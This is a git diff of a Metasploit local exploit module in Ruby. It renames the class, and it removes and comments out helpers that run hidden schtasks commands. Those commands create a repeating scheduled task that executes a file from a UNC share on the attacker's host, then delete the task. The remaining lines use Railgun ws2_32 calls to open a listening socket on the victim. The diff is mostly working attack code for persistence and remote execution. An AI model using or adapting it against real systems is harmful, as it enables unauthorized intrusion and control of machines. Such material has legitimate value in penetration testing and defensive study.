@@ -5,8 +5,8 @@
 require 'rex'
 require 'msf/core'
 
-
-class Metasploit3 < Msf::Exploit::Local
+# Removed some things that should be included...
+class MetasploitModule < Msf::Exploit::Local
   Rank = ExcellentRanking
   # errors with remove_socket
   # include Msf::Exploit::Remote::SMB::Client::Psexec
@@ -90,16 +90,6 @@ class Metasploit3 < Msf::Exploit::Local
     setup_railgun()
     sleep(1)
   end
-  
-  def proc_start(random_service)
-    start_task = "schtasks /create /sc minute /mo 5 /tn #{random_service} /tr \"\\\\#{datastore['LocalHost']}\\#{random_service}\" /F"
-    pid = client.sys.process.execute(start_task, nil, {'Hidden' => true})
-  end
- 
-  def kill_proc(random_service)
-    kill_task = "schtasks /delete /tn #{random_service} /F"
-    pid = client.sys.process.execute(kill_task, nil, {'Hidden' => true})
-  end
 
   # Use win api to create a tcp server on the box
   # This actually works really well, maybe consider adding this in future
@@ -126,10 +116,10 @@ class Metasploit3 < Msf::Exploit::Local
     r = client.railgun.ws2_32.bind(sock, sock_addr, 16)
     print_status("Socket bind with ws2_32")
     # Set the name here so we can kill it later!
-    random_service = Rex::Text.rand_text_alpha((rand(8)+6))
+    # random_service = Rex::Text.rand_text_alpha((rand(8)+6))
     begin
-      proc_start(random_service)
-      print_status("Process Started")
+      # proc_start(random_service)
+      # print_status("Process Started")
       r = client.railgun.ws2_32.listen(sock, 10)
       print_status("Socket is now listening on #{datastore['LocalHost']} we are waiting for a connect")
       r = client.railgun.ws2_32.accept(sock, nil, nil)
@@ -146,7 +136,7 @@ class Metasploit3 < Msf::Exploit::Local
       if @rsock
         @rsock.shutdown()
       end
-      kill_proc(random_service)
+      # kill_proc(random_service)
     end
   end
 
